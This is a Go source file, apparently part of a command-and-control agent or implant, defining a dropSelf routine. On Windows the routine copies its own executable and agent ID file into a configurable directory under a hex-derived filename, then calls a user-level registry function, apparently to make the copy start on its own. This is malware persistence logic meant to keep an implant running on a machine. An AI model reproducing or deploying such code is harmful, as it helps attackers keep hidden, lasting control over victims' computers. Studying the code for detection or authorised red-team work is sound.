package main

import (
	"agent/config"
	"common/debug"
	"common/machine"
	"encoding/hex"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

func dropSelf() (err error) {
	if runtime.GOOS != "windows" {
		return nil
	}

	debug.Println("Trying to persist...")

	if strings.Contains(config.PersistAtPath, "_USER_HOME_DIR") {
		homeDir, err := os.UserHomeDir()
		if err != nil {
			debug.Println("os.UserHomeDir():", err)
			return err
		}
		config.PersistAtPath = strings.ReplaceAll(config.PersistAtPath, "_USER_HOME_DIR", homeDir)
	}

	if strings.Contains(config.PersistAtPath, "_HOSTNAME") {
		hostname, err := os.Hostname()
		if err != nil {
			debug.Println("os.Hostname():", err)
			return err
		}
		config.PersistAtPath = strings.ReplaceAll(config.PersistAtPath, "_HOSTNAME", hostname)
	}

	if strings.Contains(config.PersistAtPath, "_TMP_DIR") {
		tempDir := os.TempDir()
		config.PersistAtPath = strings.ReplaceAll(config.PersistAtPath, "_TMP_DIR", tempDir)
	}

	binName := hex.EncodeToString([]byte(config.PersistAtPath + "PADDING"))[:9] + ".exe"
	currBinPath, _ := os.Executable()
	debug.Println("Curr Bin Path:", currBinPath)
	// Stop this function if agent has already persisted.
	if strings.Contains(currBinPath, binName) {
		debug.Println("Already persisted!")
		return nil
	}
	binPath := filepath.Join(config.PersistAtPath, binName)

	debug.Println("Persisting At:", config.PersistAtPath)
	os.MkdirAll(config.PersistAtPath, 0777)

	rawBin, err := os.ReadFile(currBinPath)
	if err != nil {
		debug.Println("os.ReadFile():", err)
		return err
	}

	if err := os.WriteFile(binPath, rawBin, 0777); err != nil {
		debug.Println("os.WriteFile():", err)
		return err
	}

	rawAgentID, err := os.ReadFile(config.PathToAgentID)
	if err != nil {
		return err
	}
	newAgentIdPath := filepath.Join(config.PersistAtPath, config.PathToAgentID)
	if err := os.WriteFile(newAgentIdPath, rawAgentID, 0777); err != nil {
		return err
	}

	return machine.UserLevelReg(binPath, binName)
}
